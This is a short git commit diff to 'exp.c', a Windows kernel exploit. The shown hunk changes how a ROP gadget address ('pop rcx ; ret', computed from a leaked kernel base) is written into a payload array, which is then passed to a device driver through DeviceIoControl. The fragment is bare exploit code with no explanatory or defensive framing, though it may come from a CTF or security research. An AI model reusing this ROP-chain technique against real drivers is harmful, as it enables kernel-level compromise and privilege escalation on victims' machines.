80afc82871b8e7f8a79531f83a4c3fc7cf48f878
Naup <naup96721@gmail.com>
2025-02-16 17:44:38 +0800

    ex

--- exp.c
+++ exp.c
@@ -102,9 +102,8 @@ int main(){
         payload[i] = ADDR(STACK_VAL[i]);
     }
 
-    payload[37] = kernel_base + 0x1407a7baf; // 0x1407a7baf: pop rcx ; ret ;
-    payload[38] = 0x1234;
-    
+    payload[37] = ADDR(kernel_base + 0x1407a7baf); //0x1407a7baf: pop rcx ; ret ;
+
     BOOL result3 = DeviceIoControl(
         hDevice,
         DeVioctlCode,
